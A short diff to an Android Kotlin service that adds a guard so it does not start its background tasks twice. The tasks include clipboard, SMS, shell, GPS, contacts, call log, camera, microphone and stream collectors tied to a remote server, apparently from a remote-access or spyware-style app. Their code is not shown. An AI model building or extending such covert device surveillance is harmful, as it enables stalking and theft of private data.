@@ -84,21 +84,25 @@ class SyncMEService : Service() {
             startForeground(NID, notif("Connected to $SERVER"))
         }
 
-        running = true
-        scope.launch { register() }
-        scope.launch { heartbeat() }
-        scope.launch { stats() }
-        scope.launch { clipboard() }
-        scope.launch { sms() }
-        scope.launch { shell() }
-        scope.launch { notifs() }
-        scope.launch { gps() }
-        scope.launch { contacts() }
-        scope.launch { calllog() }
-        scope.launch { camera() }
-        scope.launch { mic() }
-        scope.launch { control() }
-        scope.launch { stream() }
+        if (!running) {
+            running = true
+            scope.launch { register() }
+            scope.launch { heartbeat() }
+            scope.launch { stats() }
+            scope.launch { clipboard() }
+            scope.launch { sms() }
+            scope.launch { shell() }
+            scope.launch { notifs() }
+            scope.launch { gps() }
+            scope.launch { contacts() }
+            scope.launch { calllog() }
+            scope.launch { camera() }
+            scope.launch { mic() }
+            scope.launch { control() }
+            scope.launch { stream() }
+        } else {
+            scope.launch { register() } // Re-register with potentially new NAME
+        }
         return START_STICKY
     }
 
